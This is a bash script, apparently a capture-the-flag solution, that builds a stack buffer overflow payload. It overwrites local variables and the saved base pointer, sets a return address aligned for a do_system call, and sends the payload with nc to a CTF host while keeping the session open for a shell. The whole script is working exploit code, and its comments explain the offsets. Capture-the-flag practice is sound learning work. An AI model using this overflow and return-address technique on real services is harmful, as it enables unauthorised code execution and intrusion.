#!/bin/bash

if [[ -e payload_2 ]]; then
    rm payload_2
fi

host="ctf.adl.tw"
port=10001

# Rewrite 11 bytes for local vars
printf "helloworld\0" > payload_2
# Rewrite 37+8=45 bytes for local vars and the frame base pointer $rbp
printf 'a%.0s' {1..45} >> payload_2

# The offset for 'helloworld' is 0x40125b. However, to align the $rsp with 16 bytes after the `push $rbp` instruction, start at 0x401260.
# This is because, in the do_system() function, when executing `movaps XMMWORD PTR [rsp], xmm1`, the $rsp must be aligned to 16 bytes.
printf "\x60\x12\x40\x00\x00\x00\x00\x00" >> payload_2

cat payload_2 - | nc $host $port
